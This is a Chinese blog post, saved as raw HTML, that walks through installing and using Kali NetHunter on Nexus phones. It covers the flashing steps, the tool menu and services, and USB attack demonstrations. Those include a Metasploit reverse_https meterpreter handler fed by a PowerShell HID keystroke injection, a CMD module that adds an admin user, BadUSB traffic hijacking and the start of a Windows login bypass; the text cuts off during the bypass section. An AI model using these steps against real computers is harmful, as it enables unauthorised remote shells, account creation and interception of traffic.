<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>Pocket Hacking  NetHunter实战指南 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="post-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      

<main class="content" role="main">
  <article class="post">
    <span class="post-meta">
      <time datetime="2015-01-24T11:50:07.000Z" itemprop="datePublished">
          2015-01-24
      </time>
    
    
    | 
    <a href='/tag/Kali/'>Kali</a>,
    
    <a href='/tag/NetHunter/'>NetHunter</a>,
    
    <a href='/tag/WarDriving/'>WarDriving</a>
    
    
</span>
    <h1 class="post-title">Pocket Hacking  NetHunter实战指南</h1>
    <section class="post-content">
      <p></p>  <h3>0x00 前言</h3>  <hr align="left" size="5" width="100%" noshade="noshade">  <p>许多朋友都希望Hacking套件可以很方便的从PC移植到更便携的手机或平板电脑上,而Offensive Security团队发布的Kali NetHunter则将这一期待变为现实,通过移动终端随时随地进行Hacking,暂且美其名曰口袋Hacking.</p>  <p><a href="http://ha.cker.in/tag/kali" target="_blank">Kali</a> <a href="http://ha.cker.in/tag/NetHunter" target="_blank">NetHunter</a>是以Nexus(手机/平板)为基本硬件设备(新增对1+手机的支持),基于原生Android实现的便携渗透测试平台.熟悉的Kali使其易于上手,而图形化控制界面则使某些测试更易.基于此平台,工程师们也可自由发挥,加入个人项目.</p>  <p>关于NetHunter国内外文章相对较少且重复度高,故在此将其主要实战技巧加以整理介绍,以备各位爱好者参考.由于资料不足,难免出错之处,如有疏漏错误,望不吝赐教.</p>  <h3>0x01 硬件支持</h3>  <hr align="left" size="5" width="100%" noshade="noshade">  <p>NetHunter官网给出以下支持刷入NetHunter的手机:</p>  <pre><code>Nexus 4 (GSM) - &quot;mako&quot;</code></pre><br><br><pre><code>Nexus 5 (GSM/LTE) - &quot;hammerhead&quot;</code></pre><br><br><pre><code>Nexus 7 [2012] (Wi-Fi) - &quot;nakasi&quot;</code></pre><br><br><pre><code>Nexus 7 [2012] (Mobile) - &quot;nakasig&quot;</code></pre><br><br><pre><code>Nexus 7 [2013] (Wi-Fi) - &quot;razor&quot;</code></pre><br><br><pre><code>Nexus 7 [2013] (Mobile) - &quot;razorg&quot;</code></pre><br><br><pre><code>Nexus 10 (Tablet) - &quot;mantaray&quot;</code></pre><br><br><pre><code>OnePlus One 16 GB - &quot;bacon&quot;</code></pre><br><br><pre><code>OnePlus One 64 GB - &quot;bacon&quot;</code></pre><br><br><p>值得一提的是,2015年NetHunter更新,由于1+手机的廉价与高性能,其被加入支持列表.用1+手机的朋友有福了,以下刷机以Nexus5为例.</p>

<h3>0x02 刷机流程</h3>

<hr align="left" size="5" width="100%" noshade="noshade">

<p>官网给出几种刷机方式,推荐使用Windows引导刷机程序安装.下载地址:</p>

<p><a href="https://www.kali.org/offsec-nethunter-installer/Kali_v1.1.6.sfx.exe" target="_blank" rel="external">https://www.kali.org/offsec-nethunter-installer/Kali_v1.1.6.sfx.exe</a></p>

<p>打开安装引导程序,默认路径安装</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00113.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[13]" border="0" alt="clip_image001[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00113_thumb.png" width="1066" height="802"></a></p>

<p>安装后自动运行NetHunter Installer并更新,进入引导安装步骤</p>

<p>· Step1,选择已有硬件设备型号.</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00213.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[13]" border="0" alt="clip_image002[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00213_thumb.png" width="934" height="570"></a></p>

<p>· Step2,安装驱动</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00313.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003[13]" border="0" alt="clip_image003[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00313_thumb.png" width="930" height="568"></a></p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00412.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[12]" border="0" alt="clip_image004[12]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00412_thumb.png" width="1448" height="778"></a></p>

<p>可以通过Test Drivers测试是否安装成功</p>

<p>· Step3,安装选项</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00115.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[15]" border="0" alt="clip_image001[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00115_thumb.png" width="930" height="576"></a></p>

<p>如已经通过官网下载过刷机包,通过Browser选择文件.下载链接 <a href="http://www.offensive-security.com/kali-linux-nethunter-download/" target="_blank" rel="external">http://www.offensive-security.com/kali-linux-nethunter-download/</a> 下载后记得校验SHA1值.至于Android Flash Setting,因为对Android L的支持还未完成,故尚未开放选择.</p>

<p>· Step4,下载文件</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00215.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[15]" border="0" alt="clip_image002[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00215_thumb.png" width="928" height="576"></a></p>

<p>如图示,下载所有依赖文件.</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00315.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003[15]" border="0" alt="clip_image003[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00315_thumb.png" width="1382" height="816"></a></p>

<p>所有依赖包都为Ready可进入下一步刷机.</p>

<p>· Step5,解锁设备</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00414.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[14]" border="0" alt="clip_image004[14]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00414_thumb.png" width="930" height="576"></a></p>

<p>解锁bootloader,注意需设置允许USB调试,手机会重启解锁.</p><br><a id="more"></a><br><p></p>

<p>· Step6,重置原Android</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00511.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005[11]" border="0" alt="clip_image005[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00511_thumb.png" width="928" height="574"></a></p>

<p>同样再手机上勾选允许USB调试,注意数据会清空,记得备份.</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00611.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006[11]" border="0" alt="clip_image006[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00611_thumb.png" width="1082" height="994"></a></p>

<p>· Step7,刷入NetHunter</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00711.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007[11]" border="0" alt="clip_image007[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00711_thumb.png" width="926" height="574"></a></p>

<p>经过上一步重置手机后,需重新开启开发者模式,此时可刷入Kali Linux镜像并对手机进行Root,所需时间相对较长.(注:如镜像推送不成功,可以手工将kali_linux_nethunter_1.10_hammerhead_kitkat.zip复制到/sdcard/download/目录进行INSTALL)</p>

<p>· Final,安装成功</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00811.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008[11]" border="0" alt="clip_image008[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00811_thumb.png" width="928" height="580"></a></p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00911.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image009[11]" border="0" alt="clip_image009[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00911_thumb.png" width="1084" height="1924"></a></p>

<h3>0x03 推荐APP一览</h3>

<hr align="left" size="5" width="100%" noshade="noshade">

<p>完成系统刷入后,要丰富NetHunter原装工具,可以下载部分安卓APP以配合.以下为个人推荐</p>

<p>· 中文输入法:作为一个汉语狗还是必备的</p>

<p>· 文件管理器(如RootExplorer):Kali某些文件需要通过支持Root权限的文件管理器.</p>

<p>· ShadowSocks:梯子还是要有的</p>

<p><a href="https://github.com/shadowsocks/shadowsocks-android/releases/download/v2.6.2/shadowsocks-nightly-2.6.2.apk" target="_blank" rel="external">https://github.com/shadowsocks/shadowsocks-android/releases/download/v2.6.2/shadowsocks-nightly-2.6.2.apk</a></p>

<p>· MiTM工具:</p>

<pre><code>·&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </code><code>zANTI2:</code><code>虽为商业化限制部分功能</code><code>,</code><code>但使用体验的确好些</code><code>.</code></pre>

<pre><code>·&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </code><code>dSploit:</code><code>曾经很出名</code><code></code></pre>

<pre><code>·&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </code><code>lanmitm:</code><code>国内安全工作者编写发布的工具</code><code></code></pre>

<pre><code>·&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </code><code>Intercepter-NG:</code><code>嗅探工具</code><code> </code></pre>

<pre><code>·&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </code><code>Network Spoofer:</code><code>自带许多调戏功能</code><code></code></pre>

<p>· IPTools:部分常见基本网络工具集合</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01011.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010[11]" border="0" alt="clip_image010[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01011_thumb.png" width="1084" height="1924"></a></p>

<p>· ChangeHostname:修改当前手机主机名HostName(还是有必要的).</p>

<p>· WiGLE wifi:War Driving工具,收集无线热点信息,可保存到本地数据库.</p>

<p>· SQLiteEditor:方便读取数据库信息</p>

<p>· Hacker’s KeyBoard:NetHunter自带,便于输入各种控制字符</p>

<p>· 远程桌面:NetHunter自带,便于连接VNC服务.</p>

<p>· DriveDroid:NetHunter自带,将手机内镜像模拟为启动盘.</p>

<h3>0x04 目录与服务</h3>

<hr align="left" size="5" width="100%" noshade="noshade">

<p>安装好NetHunter,先要对其目录与服务研究一番.Kali </p>

<p>NetHunter根目录对应安卓系统目录的/data/local/kali-armhf目录</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00117.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[17]" border="0" alt="clip_image001[17]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00117_thumb.png" width="1084" height="1924"></a></p>

<p>NetHunter自带工具,也多在此目录内.故如有抓包/日志等文件,找不到存放地址,不妨到此目录下寻觅一番(注:需Root权限).另外,NetHunter某些工具运行时的提示的目录,也多以此处为根目录.</p>

<p>通常,截获的数据包等文件存放在NetHunter目录下的Captures目录:</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00217.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[17]" border="0" alt="clip_image002[17]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00217_thumb.png" width="1084" height="1924"></a></p>

<p>与Kali Linux类似,/usr/share下存放了大部分工具,并建立link,命令行可直接调用.</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00317.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003[17]" border="0" alt="clip_image003[17]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00317_thumb.png" width="1084" height="1924"></a></p>

<p>而Metasploit则依然位于/opt/目录下.</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00416.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[16]" border="0" alt="clip_image004[16]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00416_thumb.png" width="1084" height="1924"></a></p>

<p>上图中/opt/dic目录则存放有字典文件,可自行补充.</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00513.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005[13]" border="0" alt="clip_image005[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00513_thumb.png" width="1084" height="1924"></a></p>

<p>此为/var/www目录,想来大家也知道是何用处了:)</p>

<p>至于服务,Offensive Security团队在新版中加入NetHunter Home以APP的形式管理服务开关,避免了之前版本通过WebServer管理的弊端(比如Web页面调用Google Fonts被墙卡半天 ;)</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00613.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006[13]" border="0" alt="clip_image006[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00613_thumb.png" width="1084" height="1924"></a></p>

<p>如图示,NetHunter Home为主页面,除了Offensive Security的Banner,还可以获取当前IP(内网/外网)地址.</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00713.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007[13]" border="0" alt="clip_image007[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00713_thumb.png" width="1084" height="1924"></a></p>

<p>Kali Launcher整合了四个启动器:</p>

<p>· 终端打开一个Kali Shell</p>

<p>· 终端打开Kali NetHunter Menu</p>

<p>· 终端打开Wifite进入无线破解</p>

<p>· 更新Kali NetHunter(执行sudo -c bootkali update)</p>

<p>对于NetHunter服务开关控制,则在Kali Service Control面板里进行设置</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00813.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008[13]" border="0" alt="clip_image008[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00813_thumb.png" width="1084" height="1924"></a></p>

<p>可看到,NetHunter可开放服务有SSH,Dnsmasq,Hostapd,OpenVPN,Apache,Metasploit及BeEF FrameWork等.</p>

<p>· SSH服务:Secure Shell,方便其他设备连接控制.</p>

<p>· Dnsmasq服务:DNS解析服务.</p>

<p>· Hostapd服务:提供无线接入点服务.</p>

<p>· OpenVPN服务:开放OpenVPN连入服务.</p>

<p>· Apache服务:WEB服务.</p>

<p>· Metasploit服务:为MSF攻击模块提供保障.</p>

<p>· BeEF FrameWork服务:XSS利用框架服务.</p>

<p>在此面板可对对应服务进行开关设置.</p>

<h3>0x05 Kali NetHunter Menu</h3>

<hr align="left" size="5" width="100%" noshade="noshade">

<p>在NetHunter Launcher中Kali Menu的启动项,其包含整理有NetHunter常用工具,如图:</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image009.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image009" border="0" alt="clip_image009" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image009_thumb.jpg" width="964" height="544"></a></p>

<p>与上一个版本相比，新增了以下选项:</p>

<pre><code>USB Attacks</code></pre>

<pre><code>NFC Attacks</code></pre>

<pre><code>Monitor Mode</code></pre>

<pre><code>Eject USB Wifi</code></pre>

<p>主要模块及介绍如下:</p>

<p><strong>Wireless Attacks</strong></p>

<p>· Wifite</p>

<p>自动无线安全审计工具</p>

<p>· Kismet</p>

<p>无线<a href="http://ha.cker.in/tag/WarDriving" target="_blank">WarDriving</a>工具</p>

<p>· AP F**ker</p>

<p>无线网恶意攻击工具(多为拒绝服务)</p>

<p>· Wash</p>

<p>扫描开启WPS的无线网络</p>

<p>· Airodump-ng</p>

<p>基本无线攻击套件(必备)</p>

<p>· Pingen</p>

<p>针对某些开启WPS的D-link的路由器计算其PIN码以破解</p>

<p><strong>Sniffing/Spoofing</strong></p>

<p>· tcpdump</p>

<p>基本流量Dump工具</p>

<p>· tshark</p>

<p>WireShark的Cli工具,可抓取分析流量</p>

<p>· urlsnarf</p>

<p>Dsniff工具包一部分,可嗅探HTTP请求包内容，并以CLF通用日志格式输出</p>

<p>· dsniff</p>

<p>强大的知名口令嗅探工具包</p>

<p>· MITMproxy</p>

<p>中间代理,可截获修改HTTP流量,参考官网介绍</p>

<p><strong>Reverse Shells</strong></p>

<p>· AutoSSH</p>

<p>通过SSH反弹shell(NAT Bypass)</p>

<p>· pTunnel</p>

<p>通过ICMP数据包隧道传送数据</p>

<p><strong>Info Gathering</strong></p>

<p>· Spiderfoot</p>

<p>开源扫描与信息收集工具,对给定域名收集子域,Email地址,web服务器版本等信息,自动化扫描.</p>

<p>· Recon-ng</p>

<p>强大的信息收集工具,模块化,可惜许多插件国内不适用(有墙).</p>

<p>· Device-pharmer</p>

<p>通过Shodan搜索,大数据Hacking.</p>

<p><strong>Vulnerability Scan</strong></p>

<p>· OpenVas</p>

<p>漏洞扫描器,需额外安装.Kali一直默认包含,好不好用客官自行定夺. :)</p>

<p><strong>Exploit Tools</strong></p>

<p>· Metasploit</p>

<p>强大,核心,必备</p>

<p>· BeEF-XSS</p>

<p>XSS渗透测试工具,看个人习惯使用</p>

<p>· Social-Engineering-Toolkit</p>

<p>Kali下的SET,社会工程学套件,功能强大.</p>

<p>· MITMf</p>

<p>中间人攻击框架,基于Python,拥有多个插件,渗透测试功能强大</p>

<p><strong>OpenVPN Setup</strong></p>

<p>OpenVPN设置</p>

<p><strong>VNC Setup</strong></p>

<p>VNC设置</p>

<p><strong>Log/Capture Menu</strong></p>

<p>可擦除本地所有抓取数据或同步到SD</p>

<p>卡上(同步主要是解决权限问题.比如多数安卓APP未获得root权限是无法读取NetHunter工具截获的数据内容)</p>

<p><strong>USB Attacks</strong></p>

<p>· Dictionary based brute force attack</p>

<p>自动输入字典一行内容并回车,基于HID,模拟操作方式的暴力破解</p>

<p>· deADBolt</p>

<p>执行一堆ADB命令可以推送隐私文件等信息到指定目录,参考项目主页 <a href="https://github.com/photonicgeek/deADBolt" target="_blank" rel="external">https://github.com/photonicgeek/deADBolt</a></p>

<p><strong>NFC Attack</strong></p>

<p>提供了复制、重写、查看M卡数据功能(是不是不必带上Acr122u了;)</p>

<p><strong>Settings</strong></p>

<p>· 修改时区</p>

<p>· 为Metasploit创建用户和数据库</p>

<p>· 修改MAC地址</p>

<p>· 安装NodeJS</p>

<p><strong>Service</strong></p>

<p>· SSH服务开关</p>

<p>· VNC服务开关</p>

<p>· OpenVPN服务开关</p>

<p>· 在本地启动Xserver</p>

<p><strong>Monitor Mode</strong></p>

<p>启动或关闭wlan1(外置无线网卡)的混杂监听模式</p>

<p><strong>Eject USB Wifi</strong></p>

<p>弹出USB无线网卡</p>

<h3>0x06 HID KeyBoard Attack</h3>

<hr align="left" size="5" width="100%" noshade="noshade">

<p>在过去,USB自启往往依赖插入的USB设备中的autorun.inf实现.时下这招往往不灵,而新兴的USB HID Attack则成为新的安全威胁.USB HID可通过模拟键盘或鼠标操作,实时执行目标代码,在此以PowerSploit结合MSF为例:</p>

<p>首先运行提供payload的webserver,在Kali Service Control中开启Apache服务器</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00119.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[19]" border="0" alt="clip_image001[19]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00119_thumb.png" width="964" height="544"></a></p>

<p>转到HID攻击配置页面,选择PowerSploit</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00219.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[19]" border="0" alt="clip_image002[19]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00219_thumb.png" width="964" height="544"></a></p>

<p>IP和端口填写MSF监听的IP端口,Payload我们选择windows/meterpreter/reverse_https,URL为提供Apache服务的IP,这里即本机:192.168.1.151</p>

<p>配置好后UPDATE配置文件,接下来需配置MSF监听反弹shell</p>

<pre><code>root@kali:~# msfconsole -q</code></pre>

<pre><code>msf &gt; use exploit/multi/handler</code></pre>

<pre><code>msf exploit(handler) &gt;</code></pre>

<p>payload同HID配置页面中的payload</p>

<pre><code>msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_https</code></pre>

<pre><code>PAYLOAD =&gt; windows/meterpreter/reverse_https</code></pre>

<p>IP和端口同样设置</p>

<pre><code>msf exploit(handler) &gt; msf exploit(handler) &gt; set LHOST 192.168.0.17</code></pre>

<pre><code>LHOST =&gt; 192.168.0.17</code></pre>

<pre><code>msf exploit(handler) &gt; set LPORT 4444</code></pre>

<pre><code>LPORT =&gt; 443</code></pre>

<pre><code>msf exploit(handler) &gt; exploit</code></pre>

<pre><code>&#160;</code></pre>

<pre><code>[*] Started HTTPS reverse handler on https://0.0.0.0:4444/</code></pre>

<pre><code>[*] Starting the payload handler...</code></pre>

<p>至此配置OK</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00319.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003[19]" border="0" alt="clip_image003[19]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00319_thumb.png" width="964" height="544"></a></p>

<p>开始监听</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00418.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[18]" border="0" alt="clip_image004[18]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00418_thumb.png" width="964" height="544"></a></p>

<p>此时将设备连接至PC机,等待设备被识别后,执行Execute,攻击开始.</p>

<p>POWERSHELL命令执行后,就可在msf中看到反弹的shell了:</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00515.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005[15]" border="0" alt="clip_image005[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00515_thumb.png" width="964" height="544"></a></p>

<p>如连上PC后没有反应,可按Reset USB键更新.</p>

<p>当然,HID KeyBoard Attack也提供了Windows CMD攻击模块,即连入计算机后自动打开CMD并执行指定命令(默认为添加新管理员用户,可自由定制).</p>

<h3>0x07 BadUSB MITM Attack</h3>

<hr align="left" size="5" width="100%" noshade="noshade">

<p>BadUSB Attack是BlackHat大会上公布的一种较先进的USB攻击方式,模拟键盘操作等Payload可自动执行某些操作,而NetHunter的BadUSB MiTM Attack则是其中一种玩法:修改网络设定,劫持网络流量.</p>

<p>关于BadUSB MITM Attack,NetHunter官网有演示视频,详见<a href="http://www.nethunter.com/showcase/" target="_blank" rel="external">http://www.nethunter.com/showcase/</a>,但并未交代详细过程,以下笔者操作为例:</p>

<p>首先,确保手机连接目标计算机时,MTP文件传输是关闭的.连接目标计算机,打开手机USB网络共享:</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00615.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006[15]" border="0" alt="clip_image006[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00615_thumb.png" width="1924" height="1084"></a></p>

<p>此时在NetHunter Home打开一个Kali Shell,查看网卡多出虚拟网卡rndis0(USB网络共享网卡).</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00715.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007[15]" border="0" alt="clip_image007[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00715_thumb.png" width="1924" height="1084"></a></p>

<p>此时可以开启Tcpdump截获流量,命令如:</p>

<pre><code>tcpdump -i rndis0</code></pre>

<p>回到NetHunter Home,切换到BadUSB MiTM Attack,勾选右上角选项Start BadUSB Attack</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00815.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008[15]" border="0" alt="clip_image008[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00815_thumb.png" width="1924" height="1084"></a></p>

<p>被连接的计算机此时会多出一个网卡,网关为rndis0的IP地址</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00913.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image009[13]" border="0" alt="clip_image009[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00913_thumb.png" width="1160" height="524"></a></p>

<p>此时流量已可以截获,例如访问某些网站,手机tcpdump处流量显示如图:</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01013.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010[13]" border="0" alt="clip_image010[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01013_thumb.png" width="1924" height="1084"></a></p>

<p>因为手机并未插入SIM卡,无网络,故PC机并无法得到返回页面.</p>

<p>之前有同学在Drops分享的一片文章<a href="http://drops.wooyun.org/tools/3113" target="_blank" rel="external">Kali Nethunter初体验</a>中提到:</p>

<p>出现双网关现在所以并未像官网演示的那样流量直接走向恶意网关（10.0.0.1）而是依旧走的之前的网关（192.168.1.1）故劫持失败</p>

<p>这种情况也可能出现,不过个人测试中,网络连接优先级,默认劫持后的网关优先级更高,故流量可以正常劫持.也可能是NetHunter今年更新后做的优化,如图示:</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01111.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image011[11]" border="0" alt="clip_image011[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01111_thumb.png" width="1380" height="764"></a></p>

<p>当然,配合HID Keyboard Attack进行攻击测试也是很好的方式,至于数据包的保存与分析,则可自行发挥.</p>

<h3>0x08 绕过Windows登录认证</h3>

<hr align="left" size="5" width="100%" noshade="noshade">

<p>NetHunter其实有许多隐藏玩法,比如借助DriveDroid实现Windows登陆绕过密码.</p>

<p>DriveDroid本是个允许通过安卓手机中的ISO/IMG镜像文件引导启动PC机的一个App,但结合了特定的镜像,实现绕过Windows登陆认证就变得可行:)</p>

<p>在此以Win7为例,首先为默认账户创建密码hello.</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01211.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012[11]" border="0" alt="clip_image012[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01211_thumb.png" width="748" height="393"></a></p>

<p>DriveDroid默认引导镜像存放目录位于SDCard/Download/images,只需将欲引导的镜像存放于此目录即可.</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01311.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image013[11]" border="0" alt="clip_image013[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01311_thumb.png" width="902" height="442"></a></p>

